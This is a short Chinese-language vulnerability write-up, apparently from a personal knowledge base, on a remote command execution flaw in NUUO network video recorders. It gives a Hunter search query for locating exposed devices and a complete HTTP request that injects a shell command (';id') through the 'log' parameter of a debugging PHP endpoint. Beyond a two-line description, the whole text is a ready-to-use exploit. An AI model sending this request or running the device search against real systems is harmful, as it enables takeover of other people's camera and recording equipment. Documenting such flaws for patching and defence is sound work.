# ​NUUO摄像头存在远程命令执行漏洞

# 一、漏洞简介
NUUO摄像头是中国台湾NUUO公司旗下的一款网络视频记录器，该设备存在远程命令执行漏洞，攻击者可利用该漏洞执行任意命令，进而获取服务器的权限。

# 二、影响版本
+ NUUO摄像头

# 三、资产测绘
+ hunter`web.title="Network Video Recorder Login"`
+ 特征

![1699193264623-ebc62d58-8540-4b12-b89e-50db1a27bdcc.png](./img/9KTLqutzFOqS5Otb/1699193264623-ebc62d58-8540-4b12-b89e-50db1a27bdcc-947661.png)

# 四、漏洞复现
```plain
GET /__debugging_center_utils___.php?log=;id HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

![1699193298040-d4aa2125-175a-43e8-a65d-1c942d48ce5d.png](./img/9KTLqutzFOqS5Otb/1699193298040-d4aa2125-175a-43e8-a65d-1c942d48ce5d-663831.png)



> 更新: 2024-02-29 23:57:13  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qa3vprl34sg1ay3x>